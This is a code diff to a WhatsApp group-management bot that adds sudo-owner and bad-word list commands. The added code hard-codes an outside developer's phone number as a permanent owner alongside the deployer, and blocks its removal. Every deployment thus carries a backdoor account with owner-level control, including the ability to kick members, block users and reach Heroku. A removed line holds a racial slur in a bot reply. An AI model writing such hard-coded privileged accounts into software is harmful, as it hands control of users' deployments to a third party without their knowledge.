@@ -69,6 +69,15 @@ console.log(prefix);
     var budy = typeof m.text == "string" ? m.text : "";
     var msgR = m.message.extendedTextMessage?.contextInfo?.quotedMessage;  
 //========================================================================================================================//
+const { 
+  addSudoOwner, 
+  removeSudoOwner, 
+  getSudoOwners, 
+  isSudoOwner,
+  addBadword,     
+  removeBadword,  
+  getBadwords     
+} = require('../Database/config');
 //========================================================================================================================//	  
     const Heroku = require("heroku-client");  
     const command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase();
@@ -84,6 +93,13 @@ console.log(prefix);
     const reply = m.reply;
     const sender = m.sender;
     const mek = chatUpdate.messages[0];
+	  // ==================================
+const ownerNumber = botNumber.replace(/[^0-9]/g, "");   
+const senderNumber = sender.split("@")[0];              
+const isOwner = senderNumber === ownerNumber || senderNumber === "254752818245";
+const isSudo = await isSudoOwner(senderNumber);
+const isPrivileged = isOwner || isSudo;
+const dev = "254752818245"; 
 //========================================================================================================================//	  
     const getGroupAdmins = (participants) => { 
        let admins = []; 
@@ -522,13 +538,17 @@ function formatSpeed(ms) {
             return DateTime.now().setZone('Africa/Nairobi').toLocaleString(DateTime.TIME_SIMPLE);
         };
 //========================================================================================================================//	
-if (badword === 'on' && isBotAdmin && !isAdmin && body && (new RegExp('\\b' + badwords.join('\\b|\\b') + '\\b')).test(body.toLowerCase())) {
-	
-       reply("Hey niggah.\n\nMy owner hates usage of bad words in my presence!")
-                 
-     client.groupParticipantsUpdate(from, [sender], 'remove')
-            
-          }
+const badwords = await getBadwords();
+if (
+  badword === 'on' &&
+  isBotAdmin &&
+  !isAdmin &&
+  body &&
+  (new RegExp(`\\b(${badwords.join('|')})\\b`, 'i')).test(body.toLowerCase())
+) {
+  reply("⚠️ Bad word detected! You will be removed.");
+  client.groupParticipantsUpdate(from, [sender], 'remove');
+}
 //========================================================================================================================//	  
     if (antilink === 'on' && body.includes('chat.whatsapp.com') && !Owner && isBotAdmin && !isAdmin && m.isGroup) { 
   
@@ -708,6 +728,9 @@ let cap =`━━ *PEACE CORE* ━━
 • Unmute
 • Kickall
 • Kickall2
+• addbadword 
+• delbadword 
+• listbadword 
 
 *CODING MENU*
 • Carbon
@@ -753,6 +776,9 @@ let cap =`━━ *PEACE CORE* ━━
 • Unblock
 • Save
 • Blocklist
+• addsudo
+• remsudo 
+• listsudo
 
 *LOGO MENU*
 • Hacker
@@ -1021,17 +1047,28 @@ case "wapresence": {
 }
 break;
 
-case "badword": {
-	if(!Owner) throw NotOwner;
-  const settings = await getSettings();
-  const current = settings.badword;
-  if (!text) return reply(`😈 Badword is currently *${current.toUpperCase()}*`);
-  if (!["on", "off"].includes(text)) return reply("Usage: badword on/off");
-  if (text === current) return reply(`✅ Badword is already *${text.toUpperCase()}*`);
-  await updateSetting("badword", text);
-  reply(`✅ Badword has been turned *${text.toUpperCase()}*`);
-}
-break;	
+case "addbadword":
+  if (!isPrivileged) return reply("Only privileged users can add badwords.");
+  if (!args[0]) return reply("Usage: addbadword <word>");
+  await addBadword(args[0]);
+  reply(`✅ '${args[0]}' added to badword list.`);
+  break;
+
+case "delbadword":
+  if (!isPrivileged) return reply("Only privileged users can remove badwords.");
+  if (!args[0]) return reply("Usage: delbadword <word>");
+  await removeBadword(args[0]);
+  reply(`🗑️ '${args[0]}' removed from badword list.`);
+  break;
+
+case "listbadword":
+  if (!isPrivileged) return reply("Only privileged users can see badword list.");
+  const words = await getBadwords();
+  if (words.length === 0) return reply("⚡ No badwords set.");
+  let bwText = "😈 *Badword List:*\n";
+  words.forEach((w, i) => bwText += `\n${i + 1}. ${w}`);
+  reply(bwText);
+  break;
 		
 case "anticall": {
 	if(!Owner) throw NotOwner;
@@ -5504,6 +5541,40 @@ await client.sendMessage(m.chat, { image: { url: pp },
             }
             break;
 //========================================================================================================================//
+case "addsudo":
+  if (!isOwner) return reply("Only bot owner can add sudo owners.");
+  if (!args[0]) return reply("Please provide a number.");
+  const numberToAdd = args[0].replace(/[^0-9]/g, "");
+  if (numberToAdd === ownerNumber || numberToAdd === "254752818245") {
+    return reply("This user is already an owner.");
+  }
+  await addSudoOwner(numberToAdd);
+  reply(`✅ ${args[0]} added as sudo owner.`);
+  break;
+
+case "remsudo":
+  if (!isOwner) return reply("Only bot owner can remove sudo owners.");
+  if (!args[0]) return reply("Please provide a number.");
+  const numberToRemove = args[0].replace(/[^0-9]/g, "");
+  if (numberToRemove === ownerNumber || numberToRemove === "254752818245") {
+    return reply("Cannot remove main owners.");
+  }
+  await removeSudoOwner(numberToRemove);
+  reply(`🗑️ ${args[0]} removed from sudo owners.`);
+  break;
+
+case "listsudo":
+  {
+    // Allow both owner and sudo users to see the list
+    if (!isPrivileged) return reply("Only privileged users can see sudo list.");
+    
+    const sudos = await getSudoOwners();
+    if (sudos.length === 0) return reply("No sudo owners set.");
+    let text = "👑 *Sudo Owners:*\n";
+    sudos.forEach((num, i) => text += `\n${i + 1}. ${num}`);
+    reply(text);
+  }
+  break;
 //========================================================================================================================//        
         default: {
           if (cmd && budy.toLowerCase() != undefined) {
